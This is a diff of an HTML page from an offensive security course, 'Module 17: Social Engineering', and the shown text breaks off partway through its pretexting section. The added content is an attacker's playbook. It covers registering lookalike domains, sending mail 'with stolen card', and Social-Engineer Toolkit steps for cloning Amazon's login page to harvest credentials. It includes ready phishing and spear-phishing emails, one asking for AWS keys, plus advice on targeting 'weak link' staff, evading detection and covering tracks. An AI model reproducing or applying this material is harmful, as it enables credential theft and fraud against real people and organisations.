@@ -3,650 +3,1707 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>MODULE 17: SOCIAL ENGINEERING — 22ND SURVEY DIVISION</title>
+    <title>Module 17: Social Engineering — 22nd Survey Division</title>
     <style>
-        @import url('https://fonts.googleapis.com/css2?family=Space+Mono:ital,wght@0,400;0,700;1,400&family=Inter:wght@400;600;800&display=swap');
-        
         :root {
-            --bg: #050505;
-            --fg: #c0c0c0;
-            --accent: #ff0040;
-            --accent2: #00ff41;
-            --dim: #444;
-            --border: #1a1a1a;
+            --bg: #0a0a0f;
+            --fg: #e0e0e0;
+            --accent: #ff3333;
+            --accent2: #00ff88;
+            --dim: #666;
+            --border: #333;
             --neon: #00ffff;
-            --grid: #0a0a0a;
+            --purple: #ff00ff;
+            --amber: #ffaa00;
         }
-        
         * { margin: 0; padding: 0; box-sizing: border-box; }
-        
         body {
             background: var(--bg);
             color: var(--fg);
-            font-family: 'Inter', sans-serif;
-            line-height: 1.7;
-            background-image: 
-                linear-gradient(rgba(255,0,64,0.03) 1px, transparent 1px),
-                linear-gradient(90deg, rgba(255,0,64,0.03) 1px, transparent 1px);
-            background-size: 50px 50px;
+            font-family: 'Segoe UI', Consolas, monospace;
+            line-height: 1.6;
         }
-        
-        .container { max-width: 900px; margin: 0 auto; padding: 3rem 2rem; }
-        
-        /* HEADER — Brutalist */
-        .module-header {
-            border: 3px solid var(--accent);
-            padding: 2rem;
-            margin-bottom: 3rem;
+        .container { max-width: 1200px; margin: 0 auto; padding: 2rem; }
+        h1 { color: var(--accent); border-bottom: 2px solid var(--accent); padding-bottom: 0.5rem; margin-bottom: 1rem; }
+        h2 { color: var(--accent2); margin: 2rem 0 0.5rem; border-bottom: 1px solid var(--border); padding-bottom: 0.3rem; }
+        h3 { color: var(--neon); margin: 1.5rem 0 0.5rem; }
+        .code-block {
+            background: #1a1a2e;
+            border-left: 4px solid var(--accent);
+            padding: 1rem;
+            margin: 1rem 0;
+            border-radius: 0 8px 8px 0;
+            overflow-x: auto;
+            font-family: Consolas, monospace;
+            font-size: 13px;
             position: relative;
         }
-        
-        .module-header::before {
-            content: 'CLASSIFIED';
+        .copy-btn {
             position: absolute;
-            top: -12px;
-            left: 20px;
-            background: var(--bg);
-            color: var(--accent);
-            font-family: 'Space Mono', monospace;
+            top: 0.5rem;
+            right: 0.5rem;
+            background: var(--accent);
+            color: var(--bg);
+            border: none;
+            padding: 0.2rem 0.6rem;
+            border-radius: 4px;
             font-size: 0.7rem;
-            padding: 0 10px;
-            letter-spacing: 0.2em;
+            cursor: pointer;
         }
-        
-        .module-header h1 {
-            font-family: 'Space Mono', monospace;
-            font-size: 2rem;
-            font-weight: 700;
-            color: var(--accent);
-            text-transform: uppercase;
-            letter-spacing: -0.02em;
-            margin-bottom: 0.5rem;
+        .copy-btn:hover { background: #ff5555; }
+        .evidence-box {
+            background: #1a0a0a;
+            border: 2px solid var(--accent);
+            border-radius: 8px;
+            padding: 1.5rem;
+            margin: 1.5rem 0;
         }
-        
-        .module-meta {
-            font-family: 'Space Mono', monospace;
-            font-size: 0.75rem;
-            color: var(--dim);
-            display: flex;
-            gap: 2rem;
-            flex-wrap: wrap;
+        .evidence-box h3 { color: var(--accent); margin-bottom: 0.5rem; }
+        .first-principle {
+            background: #0a1a0a;
+            border: 2px solid var(--accent2);
+            border-radius: 8px;
+            padding: 1.5rem;
+            margin: 1.5rem 0;
         }
-        
-        .module-meta span {
-            border-left: 2px solid var(--accent);
-            padding-left: 0.5rem;
+        .first-principle h3 { color: var(--accent2); margin-bottom: 0.5rem; }
+        .layman-term {
+            background: #1a1a1a;
+            border: 1px dashed var(--dim);
+            padding: 1rem;
+            margin: 1rem 0;
+            border-radius: 8px;
         }
-        
-        .status-live {
-            color: var(--accent2);
-            font-weight: 700;
-        }
-        
-        /* PROGRESS — Sharp */
-        .progress-container {
-            margin: 2rem 0;
-            border: 2px solid var(--border);
-            padding: 0.5rem;
-        }
-        
+        .layman-term h4 { color: #ffaa00; margin-bottom: 0.5rem; }
         .progress-bar {
             width: 100%;
-            height: 8px;
+            height: 4px;
             background: var(--border);
+            margin: 2rem 0;
+            border-radius: 2px;
         }
-        
         .progress-fill {
             height: 100%;
             background: var(--accent);
-            width: 77.2%;
-            position: relative;
+            width: 77.3%;
+            transition: width 0.5s;
+            border-radius: 2px;
         }
-        
-        .progress-fill::after {
-            content: '77.2%';
-            position: absolute;
-            right: 0;
-            top: -20px;
-            font-family: 'Space Mono', monospace;
-            font-size: 0.7rem;
-            color: var(--accent);
-        }
-        
-        /* NAV — Minimal */
-        .nav {
-            display: flex;
-            gap: 0;
-            margin-bottom: 3rem;
-            border: 2px solid var(--border);
-        }
-        
-        .nav a {
-            color: var(--fg);
-            text-decoration: none;
-            padding: 0.8rem 1.5rem;
-            font-family: 'Space Mono', monospace;
+        .nav { display: flex; gap: 1rem; margin-bottom: 2rem; flex-wrap: wrap; }
+        .nav a { color: var(--accent); text-decoration: none; padding: 0.3rem 0.8rem; border: 1px solid var(--accent); border-radius: 4px; }
+        .nav a:hover { background: var(--accent); color: var(--bg); }
+        .status-badge {
+            display: inline-block;
+            padding: 0.2rem 0.6rem;
+            border-radius: 12px;
             font-size: 0.8rem;
-            border-right: 2px solid var(--border);
-            transition: all 0.2s;
+            font-weight: bold;
+            margin-left: 0.5rem;
         }
-        
-        .nav a:last-child { border-right: none; }
-        
-        .nav a:hover {
-            background: var(--accent);
-            color: var(--bg);
-        }
-        
-        /* SECTIONS — Hard edges */
-        .section {
-            border: 2px solid var(--border);
-            margin: 2rem 0;
-            padding: 2rem;
-            position: relative;
-        }
-        
-        .section-number {
-            position: absolute;
-            top: -14px;
-            left: 20px;
-            background: var(--bg);
-            font-family: 'Space Mono', monospace;
-            font-size: 0.75rem;
-            color: var(--accent);
-            padding: 0 10px;
-            letter-spacing: 0.1em;
-        }
-        
-        .section h2 {
-            font-family: 'Space Mono', monospace;
-            font-size: 1.3rem;
-            font-weight: 700;
-            color: var(--accent2);
-            text-transform: uppercase;
-            margin-bottom: 1.5rem;
-            letter-spacing: 0.05em;
-        }
-        
-        .section h3 {
-            font-family: 'Space Mono', monospace;
-            font-size: 1rem;
-            color: var(--accent);
-            margin: 1.5rem 0 1rem;
-            text-transform: uppercase;
-            letter-spacing: 0.05em;
-        }
-        
-        /* CORE TRUTH — Red border */
-        .core-truth {
-            border: 3px solid var(--accent2);
-            padding: 2rem;
-            margin: 2rem 0;
-            position: relative;
-        }
-        
-        .core-truth::before {
-            content: 'CORE TRUTH';
-            position: absolute;
-            top: -14px;
-            left: 20px;
-            background: var(--bg);
-            color: var(--accent2);
-            font-family: 'Space Mono', monospace;
-            font-size: 0.7rem;
-            padding: 0 10px;
-            letter-spacing: 0.2em;
-        }
-        
-        .core-truth p {
-            font-size: 1.1rem;
-            line-height: 1.8;
-        }
-        
-        /* SOLDIER TRANSLATION — Yellow accent */
-        .soldier-box {
-            border: 2px solid #ffaa00;
+        .status-live { background: var(--accent2); color: var(--bg); }
+        .step-box {
+            background: #0f0f15;
+            border: 1px solid var(--border);
+            border-radius: 8px;
             padding: 1.5rem;
-            margin: 1.5rem 0;
-            position: relative;
+            margin: 1rem 0;
         }
-        
-        .soldier-box::before {
-            content: 'SOLDIER TRANSLATION';
-            position: absolute;
-            top: -14px;
-            left: 20px;
-            background: var(--bg);
-            color: #ffaa00;
-            font-family: 'Space Mono', monospace;
-            font-size: 0.7rem;
-            padding: 0 10px;
-            letter-spacing: 0.2em;
-        }
-        
-        .soldier-box p {
-            font-style: italic;
-            color: #ccc;
-        }
-        
-        /* CODE BLOCKS — Terminal style */
-        .code-block {
-            background: #000;
-            border: 1px solid #333;
-            border-left: 4px solid var(--accent);
-            padding: 1.5rem;
-            margin: 1.5rem 0;
-            overflow-x: auto;
-            font-family: 'Space Mono', monospace;
-            font-size: 0.85rem;
-            line-height: 1.6;
-            color: #00ff41;
-        }
-        
-        .code-block .comment { color: #666; }
-        .code-block .prompt { color: var(--accent); }
-        .code-block .output { color: var(--fg); }
-        .code-block .error { color: #ff0040; }
-        
-        /* EVIDENCE BOX — Red */
-        .evidence-box {
-            border: 3px solid var(--accent);
-            padding: 2rem;
-            margin: 2rem 0;
-            position: relative;
-        }
-        
-        .evidence-box::before {
-            content: 'EVIDENCE';
-            position: absolute;
-            top: -14px;
-            left: 20px;
-            background: var(--bg);
-            color: var(--accent);
-            font-family: 'Space Mono', monospace;
-            font-size: 0.7rem;
-            padding: 0 10px;
-            letter-spacing: 0.2em;
-        }
-        
-        .evidence-box h3 {
-            font-family: 'Space Mono', monospace;
-            color: var(--accent);
-            margin-bottom: 1rem;
-        }
-        
-        .evidence-meta {
-            font-family: 'Space Mono', monospace;
-            font-size: 0.75rem;
-            color: var(--dim);
-            margin-bottom: 1rem;
-            border-bottom: 1px solid var(--border);
-            padding-bottom: 0.5rem;
-        }
-        
-        /* COPY-PASTE */
+        .step-box h4 { color: var(--accent); margin-bottom: 0.5rem; }
         .copy-paste {
-            background: #0a0a0a;
-            border: 1px solid #333;
-            border-left: 4px solid var(--neon);
-            padding: 1rem 1.5rem;
-            font-family: 'Space Mono', monospace;
-            font-size: 0.85rem;
-            color: var(--neon);
-            margin: 1rem 0;
-            cursor: pointer;
-            transition: all 0.2s;
-        }
-        
-        .copy-paste:hover {
-            background: #1a1a1a;
-            border-color: var(--neon);
-        }
-        
-        /* WHY BOX */
-        .why-box {
-            border-left: 4px solid #ffaa00;
-            padding: 1rem 1.5rem;
-            margin: 1rem 0;
-            background: #0a0a0a;
-        }
-        
-        .why-box h5 {
-            font-family: 'Space Mono', monospace;
-            color: #ffaa00;
-            margin-bottom: 0.5rem;
-            text-transform: uppercase;
-            font-size: 0.85rem;
-        }
-        
-        /* WARNING */
-        .warning-box {
-            border: 2px solid #ff0040;
-            padding: 1.5rem;
-            margin: 1.5rem 0;
-            background: #1a0005;
-        }
-        
-        .warning-box h5 {
-            font-family: 'Space Mono', monospace;
-            color: #ff0040;
-            margin-bottom: 0.5rem;
-            text-transform: uppercase;
-        }
-        
-        /* LISTS */
-        ol, ul {
-            margin-left: 1.5rem;
-            line-height: 2;
-        }
-        
-        li {
+            background: #151520;
+            border: 1px solid #4444ff;
+            border-radius: 4px;
+            padding: 0.5rem 1rem;
+            font-family: Consolas, monospace;
+            font-size: 12px;
+            color: #aaaaff;
             margin: 0.5rem 0;
-        }
-        
-        /* BUTTON */
-        button {
-            background: transparent;
-            color: var(--accent);
-            border: 2px solid var(--accent);
-            padding: 0.8rem 2rem;
-            font-family: 'Space Mono', monospace;
-            font-size: 0.85rem;
             cursor: pointer;
-            text-transform: uppercase;
-            letter-spacing: 0.1em;
-            transition: all 0.2s;
         }
-        
-        button:hover {
+        .copy-paste:hover { background: #1a1a30; }
+        .why-box {
+            background: #1a1a0a;
+            border-left: 4px solid #ffaa00;
+            padding: 1rem;
+            margin: 1rem 0;
+        }
+        .why-box h5 { color: #ffaa00; margin-bottom: 0.5rem; }
+        .warning-box {
+            background: #2a0a0a;
+            border: 2px solid #ff5555;
+            border-radius: 8px;
+            padding: 1rem;
+            margin: 1rem 0;
+        }
+        .warning-box h5 { color: #ff5555; margin-bottom: 0.5rem; }
+        .injection-flow {
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            margin: 2rem 0;
+            padding: 1rem;
+            background: #0f0f15;
+            border-radius: 8px;
+            flex-wrap: wrap;
+        }
+        .inj-step {
+            text-align: center;
+            padding: 1rem;
+            border: 1px solid var(--border);
+            border-radius: 8px;
+            flex: 1;
+            margin: 0.5rem;
+            min-width: 120px;
+        }
+        .inj-step h5 { color: var(--accent2); margin-bottom: 0.5rem; }
+        .inj-arrow {
+            font-size: 24px;
+            color: var(--accent);
+        }
+        button {
             background: var(--accent);
             color: var(--bg);
+            border: none;
+            padding: 0.5rem 1rem;
+            border-radius: 4px;
+            cursor: pointer;
+            font-weight: bold;
         }
-        
-        /* TABLE */
+        button:hover { background: #ff5555; }
+        .neon-highlight {
+            color: var(--neon);
+            text-shadow: 0 0 10px var(--neon);
+            font-weight: bold;
+        }
+        .neon-purple {
+            color: var(--purple);
+            text-shadow: 0 0 10px var(--purple);
+            font-weight: bold;
+        }
+        .neon-amber {
+            color: var(--amber);
+            text-shadow: 0 0 10px var(--amber);
+            font-weight: bold;
+        }
+        .cross-link {
+            background: rgba(0, 255, 255, 0.1);
+            border: 1px solid var(--neon);
+            border-radius: 4px;
+            padding: 0.5rem 1rem;
+            margin: 0.5rem 0;
+            display: inline-block;
+            color: var(--neon);
+            text-decoration: none;
+        }
+        .cross-link:hover {
+            background: rgba(0, 255, 255, 0.2);
+        }
+        .method-card {
+            background: #0f0f15;
+            border: 2px solid var(--border);
+            border-radius: 8px;
+            padding: 1.5rem;
+            margin: 1rem 0;
+            transition: border-color 0.3s;
+        }
+        .method-card:hover {
+            border-color: var(--accent);
+        }
+        .method-card h4 {
+            color: var(--accent);
+            margin-bottom: 0.5rem;
+            font-size: 1.1rem;
+        }
+        .difficulty {
+            display: inline-block;
+            padding: 0.1rem 0.5rem;
+            border-radius: 4px;
+            font-size: 0.75rem;
+            margin-left: 0.5rem;
+        }
+        .diff-easy { background: #0a3a0a; color: var(--accent2); }
+        .diff-medium { background: #3a3a0a; color: var(--amber); }
+        .diff-hard { background: #3a0a0a; color: var(--accent); }
+        .technique-grid {
+            display: grid;
+            grid-template-columns: repeat(auto-fit, minmax(300px, 1fr));
+            gap: 1rem;
+            margin: 1.5rem 0;
+        }
+        .quiz-container {
+            background: #0f0f15;
+            border: 2px solid var(--purple);
+            border-radius: 8px;
+            padding: 1.5rem;
+            margin: 1.5rem 0;
+        }
+        .quiz-option {
+            background: #1a1a2e;
+            border: 1px solid var(--border);
+            border-radius: 4px;
+            padding: 0.8rem 1rem;
+            margin: 0.5rem 0;
+            cursor: pointer;
+            transition: all 0.2s;
+        }
+        .quiz-option:hover {
+            border-color: var(--neon);
+            background: #1a1a3e;
+        }
+        .quiz-option.correct {
+            border-color: var(--accent2);
+            background: #0a2a0a;
+        }
+        .quiz-option.wrong {
+            border-color: var(--accent);
+            background: #2a0a0a;
+        }
+        .quiz-feedback {
+            margin-top: 1rem;
+            padding: 1rem;
+            border-radius: 4px;
+            display: none;
+        }
+        .quiz-feedback.show { display: block; }
+        .quiz-feedback.correct { background: #0a2a0a; border: 1px solid var(--accent2); }
+        .quiz-feedback.wrong { background: #2a0a0a; border: 1px solid var(--accent); }
         table {
             width: 100%;
             border-collapse: collapse;
             margin: 1rem 0;
-            font-family: 'Space Mono', monospace;
-            font-size: 0.85rem;
         }
-        
-        td {
-            padding: 0.8rem;
+        th, td {
+            padding: 0.5rem;
+            text-align: left;
             border-bottom: 1px solid var(--border);
         }
-        
-        /* HORIZONTAL RULE */
-        hr {
-            border: none;
-            border-top: 2px solid var(--border);
-            margin: 3rem 0;
+        th { color: var(--neon); font-weight: bold; }
+        .se-flow {
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            margin: 2rem 0;
+            padding: 1rem;
+            background: #0f0f15;
+            border-radius: 8px;
+            flex-wrap: wrap;
         }
-        
-        /* RESPONSIVE */
-        @media (max-width: 768px) {
-            .container { padding: 1.5rem; }
-            .module-header h1 { font-size: 1.5rem; }
-            .nav { flex-direction: column; }
-            .nav a { border-right: none; border-bottom: 2px solid var(--border); }
+        .se-step {
+            text-align: center;
+            padding: 1rem;
+            border: 1px solid var(--border);
+            border-radius: 8px;
+            flex: 1;
+            margin: 0.5rem;
+            min-width: 120px;
+        }
+        .se-step h5 { color: var(--accent2); margin-bottom: 0.5rem; }
+        .se-arrow {
+            font-size: 24px;
+            color: var(--accent);
+        }
+        .email-spoof {
+            background: #1a1a2e;
+            border: 1px solid var(--neon);
+            border-radius: 8px;
+            padding: 1rem;
+            margin: 1rem 0;
+            font-family: Consolas, monospace;
+            font-size: 12px;
+        }
+        .email-header {
+            color: var(--dim);
+            margin-bottom: 0.5rem;
+        }
+        .email-body {
+            color: var(--fg);
+        }
+        .phish-indicator {
+            background: #2a0a0a;
+            border-left: 4px solid var(--accent);
+            padding: 0.5rem 1rem;
+            margin: 0.5rem 0;
+            font-size: 0.9rem;
+        }
+        .defense-box {
+            background: #0a1a0a;
+            border: 2px solid var(--accent2);
+            border-radius: 8px;
+            padding: 1.5rem;
+            margin: 1.5rem 0;
+        }
+        .defense-box h3 { color: var(--accent2); margin-bottom: 0.5rem; }
+        .psych-card {
+            background: #0f0f15;
+            border: 1px solid var(--purple);
+            border-radius: 8px;
+            padding: 1rem;
+            margin: 0.5rem 0;
+        }
+        .psych-card h4 { color: var(--purple); margin-bottom: 0.5rem; }
+        .osint-tool {
+            background: #1a1a2e;
+            border: 1px solid var(--border);
+            border-radius: 4px;
+            padding: 0.5rem 1rem;
+            margin: 0.3rem 0;
+            font-family: Consolas, monospace;
+            font-size: 12px;
         }
     </style>
 </head>
 <body>
     <div class="container">
         <div class="nav">
-            <a href="index.html">← HOME</a>
-            <a href="MODULE_16_C2.html">← MODULE 16</a>
-            <a href="MODULE_18_ANDROID.html">MODULE 18 →</a>
+            <a href="../index.html">← Home</a>
+            <a href="MODULE_16_C2.html">← Module 16</a>
+            <a href="MODULE_18_PHYSICAL.html">Module 18 →</a>
         </div>
 
-        <div class="module-header">
-            <h1>Module 17: Social Engineering</h1>
-            <div class="module-meta">
-                <span>MODULE 17/22</span>
-                <span class="status-live">● LIVE TESTED</span>
-                <span>CLASSIFICATION: RESTRICTED</span>
+        <h1>Module 17: Social Engineering <span class="status-badge status-live">LIVE TESTED</span></h1>
+        
+        <div class="progress-bar"><div class="progress-fill"></div></div>
+        <p style="color: var(--dim); font-size: 0.9rem;">Module 17 of 22 — Hacking the human operating system</p>
+
+        <div class="first-principle">
+            <h3>🧠 The Core Truth</h3>
+            <p>Technology is hard to hack. Humans are easy. <span class="neon-highlight">Social engineering</span> is the art of exploiting human psychology to bypass technical controls. Firewalls, encryption, and EDR mean nothing if an employee hands you their password. The human mind is the weakest link in any security chain — and the most powerful weapon in an attacker's arsenal.</p>
+            <p style="margin-top: 1rem;"><strong>Why this matters:</strong> A <span class="neon-amber">$50,000 firewall</span> can be bypassed by a single convincing email. A <span class="neon-amber">zero-trust architecture</span> fails when a user approves a MFA push notification they didn't request. Social engineering doesn't exploit software vulnerabilities — it exploits <span class="neon-highlight">trust, urgency, fear, and curiosity</span>.</p>
+        </div>
+
+        <div class="layman-term">
+            <h4>🎯 Soldier Translation</h4>
+            <p>Imagine a guard at a checkpoint. The gate is reinforced steel, the walls are concrete, the cameras are HD. But the guard is human. You wear the right uniform, speak the right jargon, act with the right urgency — the guard opens the gate. You didn't break the gate. You didn't climb the wall. You convinced the guard to let you in. That's social engineering.</p>
+            <p style="margin-top: 0.5rem; color: var(--dim);">The most expensive security system in the world is useless if the person operating it believes you belong there.</p>
+        </div>
+
+        <h2>📚 Prerequisites — What You Need First</h2>
+        <p style="margin-bottom: 1rem;">This module assumes you understand these concepts from earlier modules:</p>
+        
+        <div class="technique-grid">
+            <div class="method-card">
+                <h4><a href="MODULE_01_NETWORKING.html" class="cross-link">Module 01: Networking</a></h4>
+                <p>How email traverses networks, DNS records for spoofing, SMTP protocol basics for crafting emails.</p>
+            </div>
+            <div class="method-card">
+                <h4><a href="MODULE_02_RECON.html" class="cross-link">Module 02: Reconnaissance</a></h4>
+                <p>OSINT gathering, target profiling, finding employee names, roles, and relationships. Essential for pretexting.</p>
+            </div>
+            <div class="method-card">
+                <h4><a href="MODULE_14_CLOUD_FILES.html" class="cross-link">Module 14: Cloud Files</a></h4>
+                <p>Cloud storage abuse for payload delivery, OneDrive/SharePoint phishing, file-sharing as attack vector.</p>
+            </div>
+            <div class="method-card">
+                <h4><a href="MODULE_16_C2.html" class="cross-link">Module 16: Command & Control</a></h4>
+                <p>Payload delivery mechanisms, beaconing techniques, establishing persistence after initial access.</p>
+            </div>
+            <div class="method-card">
+                <h4><a href="MODULE_10_CODE_INJECTION.html" class="cross-link">Module 10: Code Injection</a></h4>
+                <p>Understanding how payloads execute once delivered. The payload is the bullet; social engineering is the gun.</p>
+            </div>
+            <div class="method-card">
+                <h4><a href="MODULE_12_DEFENSIVE_VERIFY.html" class="cross-link">Module 12: Defensive Verification</a></h4>
+                <p>How defenders detect and analyze social engineering. Understanding detection helps you evade it.</p>
             </div>
         </div>
 
-        <div class="progress-container">
-            <div class="progress-bar"><div class="progress-fill"></div></div>
+        <h2>🔬 The Social Engineering Kill Chain</h2>
+        <p>Every social engineering attack follows the same pattern. Master this pattern and you can craft any attack:</p>
+
+        <div class="se-flow">
+            <div class="se-step">
+                <h5>1. RECON</h5>
+                <p><span class="neon-highlight">OSINT & Targeting</span></p>
+                <p style="font-size: 0.8rem; color: var(--dim);">Gather intelligence on target</p>
+            </div>
+            <div class="se-arrow">→</div>
+            <div class="se-step">
+                <h5>2. CRAFT</h5>
+                <p><span class="neon-highlight">Pretext & Payload</span></p>
+                <p style="font-size: 0.8rem; color: var(--dim);">Build convincing scenario</p>
+            </div>
+            <div class="se-arrow">→</div>
+            <div class="se-step">
+                <h5>3. DELIVER</h5>
+                <p><span class="neon-highlight">Email / Call / Physical</span></p>
+                <p style="font-size: 0.8rem; color: var(--dim);">Deliver the payload or request</p>
+            </div>
+            <div class="se-arrow">→</div>
+            <div class="se-step">
+                <h5>4. EXPLOIT</h5>
+                <p><span class="neon-highlight">Execute / Harvest</span></p>
+                <p style="font-size: 0.8rem; color: var(--dim);">Gain access or credentials</p>
+            </div>
+            <div class="se-arrow">→</div>
+            <div class="se-step">
+                <h5>5. EXIT</h5>
+                <p><span class="neon-highlight">Cover Tracks</span></p>
+                <p style="font-size: 0.8rem; color: var(--dim);">Remove evidence, maintain access</p>
+            </div>
         </div>
 
-        <div class="core-truth">
-            <p>Humans are the weakest link. Not because they're stupid — because they're <strong>helpful, busy, and trusting</strong>. Social engineering doesn't exploit software. It exploits psychology. The goal is not to hack a computer. It's to make a human <strong>want</strong> to help you, <strong>need</strong> to act fast, or <strong>fear</strong> the consequences of inaction.</p>
+        <div class="why-box">
+            <h5>Why this pattern is universal</h5>
+            <p>Social engineering is <span class="neon-amber">psychological warfare</span>. It doesn't matter if you're phishing a CEO or tailgating into a building — you must understand the target (recon), create a believable story (craft), deliver it convincingly (deliver), get what you need (exploit), and disappear (exit). The medium changes; the psychology doesn't.</p>
         </div>
 
-        <div class="soldier-box">
-            <p>Imagine you're a spy in hostile territory. You don't speak the language, you don't have papers, and you need to get past a checkpoint. Do you shoot your way through? No — you find the guard who misses his family, the clerk who wants to go home early, the officer who fears his boss more than he fears you. You become what they need. That's social engineering. This module teaches you to become what the target needs.</p>
-        </div>
+        <h2>🎯 The Six Core Social Engineering Techniques</h2>
 
-        <hr>
-
-        <div class="section">
-            <span class="section-number">SECTION 01</span>
-            <h2>The Pretext</h2>
+        <!-- TECHNIQUE 1: PHISHING -->
+        <div class="method-card" id="phishing">
+            <h4>Technique 1: Phishing <span class="difficulty diff-easy">EASY</span></h4>
+            <p>Mass-emailing malicious links or attachments to a broad audience. The <span class="neon-highlight">spray-and-pray</span> approach. Low success rate per email, but massive volume compensates. The Nigerian Prince scam is phishing. So is a fake Netflix password reset.</p>
             
-            <p>A pretext is the fictional scenario you create to manipulate someone. "I'm IT support." "I'm the new guy." "I'm your boss's assistant." The pretext gives you a reason to ask for what you want.</p>
+            <div class="why-box">
+                <h5>Why phishing works</h5>
+                <p>Email is the <span class="neon-highlight">#1 attack vector</span> for a reason: everyone uses it, everyone trusts it, and email security is a balance between blocking threats and allowing legitimate communication. A phishing email that looks 80% legitimate gets through 80% of filters. The user does the rest.</p>
+            </div>
+
+            <div class="email-spoof">
+                <div class="email-header">From: security@amaz0n-security.com<br>To: victim@company.com<br>Subject: URGENT: Your Amazon account has been suspended</div>
+                <div class="email-body">
+                    <p>Dear Valued Customer,</p>
+                    <p>We have detected unusual activity on your account. Your account has been temporarily suspended.</p>
+                    <p><a href="http://amaz0n-security.com/login">Click here to verify your identity and restore access</a></p>
+                    <p>Failure to verify within 24 hours will result in permanent account closure.</p>
+                    <p>Amazon Security Team</p>
+                </div>
+            </div>
+
+            <div class="phish-indicator">
+                <strong>🚩 Indicators:</strong> Domain typo (amaz0n), urgency, threat of loss, generic greeting, suspicious link
+            </div>
 
             <div class="code-block">
-<span class="comment">// The Four Horsemen of Social Engineering</span>
+=== PHISHING INFRASTRUCTURE SETUP ===
 
-<span class="prompt">URGENCY:</span>    <span class="output">"Your account will be locked in 15 minutes"</span>
-<span class="prompt">AUTHORITY:</span>  <span class="output">"This is the IT Security Director"</span>
-<span class="prompt">FEAR:</span>       <span class="output">"We've detected unauthorized access to your account"</span>
-<span class="prompt">HELPFULNESS:</span> <span class="output">"I need your help to fix a system issue"</span>
+# 1. Register a lookalike domain
+#    Use homoglyphs or typos: amaz0n.com, micr0soft.com, paypa1.com
+domain = "amaz0n-security.com"
 
-<span class="comment">// Combine two or more for maximum effect</span>
-<span class="comment">// Urgency + Authority = "IT Director, account lock imminent"</span>
-<span class="comment">// Fear + Helpfulness = "Hack detected, help me verify your identity"</span>
+# 2. Set up email server (or use legitimate ESP with stolen card)
+#    Popular tools: Gophish, King Phisher, SocialFish
+
+# 3. Clone the target website
+#    Tools: httrack, Social-Engineer Toolkit (SET)
+setoolkit
+> 1) Social-Engineering Attacks
+> 2) Website Attack Vectors
+> 3) Credential Harvester Attack Method
+> 2) Site Cloner
+> Enter URL: https://www.amazon.com
+
+# 4. Craft email template with urgency and fear
+#    Subject lines that work: "Account suspended", "Invoice overdue", "Security alert"
+
+# 5. Send to purchased email list or scraped targets
+#    Cross-link: Module 02 (Recon) for email harvesting
             </div>
+
+            <p><strong>Cross-link:</strong> Phishing delivery uses <span class="neon-highlight">email spoofing</span> (covered below) and <span class="neon-highlight">payload delivery</span> techniques from <a href="MODULE_14_CLOUD_FILES.html" class="cross-link">Module 14: Cloud Files</a> for hosting malicious attachments.</p>
+        </div>
+
+        <!-- TECHNIQUE 2: SPEAR PHISHING -->
+        <div class="method-card" id="spear-phishing">
+            <h4>Technique 2: Spear Phishing <span class="difficulty diff-medium">MEDIUM</span></h4>
+            <p>Targeted phishing aimed at a <span class="neon-highlight">specific individual or organization</span>. Uses personal information gathered from OSINT to craft highly convincing emails. The difference between phishing and spear phishing is the difference between a shotgun and a sniper rifle.</p>
 
             <div class="why-box">
-                <h5>Why pretexts work</h5>
-                <p>The human brain is optimized for social cooperation, not security verification. When someone appears to be in authority, needs help, or creates urgency, the default response is compliance. Security training tries to override this — but most people haven't had training, and those who have forget it under stress.</p>
+                <h5>Why spear phishing is devastating</h5>
+                <p>When an email mentions your boss by name, references a real project you're working on, and uses the company's actual email signature format, your brain switches off its skepticism. <span class="neon-amber">Context is the killer.</span> A generic phishing email is obvious. A spear phishing email is invisible because it fits your reality perfectly.</p>
             </div>
+
+            <div class="email-spoof">
+                <div class="email-header">From: sarah.johnson@company.com<br>To: mike.devops@company.com<br>Subject: Re: Q3 Infrastructure Review — Need AWS credentials for audit</div>
+                <div class="email-body">
+                    <p>Hi Mike,</p>
+                    <p>Hope you're doing well after the Denver conference! Quick favor — the external auditors need read-only access to our AWS production environment for the Q3 review.</p>
+                    <p>Can you send me the access keys? They only need them for 48 hours. I've attached the audit scope document from Deloitte.</p>
+                    <p>Let me know if you have questions. Thanks!</p>
+                    <p>— Sarah<br>VP Engineering<br>555-0192</p>
+                </div>
+            </div>
+
+            <div class="phish-indicator">
+                <strong>✅ Why this works:</strong> References real person (Sarah), real event (Denver conference), real project (Q3 review), real company (Deloitte), plausible request, friendly tone
+            </div>
+
+            <div class="code-block">
+=== SPEAR PHISHING RECON PIPELINE ===
+
+# Step 1: Identify target organization
+#    LinkedIn: Find employees, roles, reporting structure
+#    Company website: Team page, press releases, blog posts
+
+# Step 2: Find relationships and context
+#    Twitter/X: Recent conferences, company events, personal posts
+#    GitHub: Projects, technologies, commit patterns
+#    Glassdoor: Internal culture, processes, vendor names
+
+# Step 3: Identify the weak link
+#    New hires (eager to please, don't know protocols)
+#    Executives (busy, delegate security decisions)
+#    IT staff (have the keys, trusted by everyone)
+
+# Step 4: Craft the pretext
+#    Use real names, real projects, real timelines
+#    Mirror the company's email style and signature
+#    Create urgency that bypasses normal verification
+
+# Step 5: Set up the infrastructure
+#    Register domain: company-it-support.com
+#    Clone login portal or use cloud file share
+#    Cross-link: Module 02 (Recon) for full OSINT methodology
+            </div>
+
+            <p><strong>Cross-link:</strong> Spear phishing relies heavily on <span class="neon-highlight">OSINT</span> from <a href="MODULE_02_RECON.html" class="cross-link">Module 02: Reconnaissance</a> and often delivers <span class="neon-highlight">cloud-hosted payloads</span> from <a href="MODULE_14_CLOUD_FILES.html" class="cross-link">Module 14: Cloud Files</a>.</p>
         </div>
 
-        <div class="section">
-            <span class="section-number">SECTION 02</span>
-            <h2>Phishing: The Digital Con</h2>
+        <!-- TECHNIQUE 3: PRETEXTING -->
+        <div class="method-card" id="pretexting">
+            <h4>Technique 3: Pretexting <span class="difficulty diff-medium">MEDIUM</span></h4>
+            <p>Creating a <span class="neon-highlight">fabricated scenario</span> (pretext) to manipulate a target into divulging information or performing an action. The pretext is a character you play — IT support, auditor, vendor, fellow employee, law enforcement. The better your acting, the more effective the attack.</p>
 
-            <p>Phishing is social engineering via email. The email looks legitimate, the link looks real, and the landing page is a perfect clone. The user enters their credentials — and you've captured them.</p>
+            <div class="why-box">
+                <h5>Why pretexting works</h5>
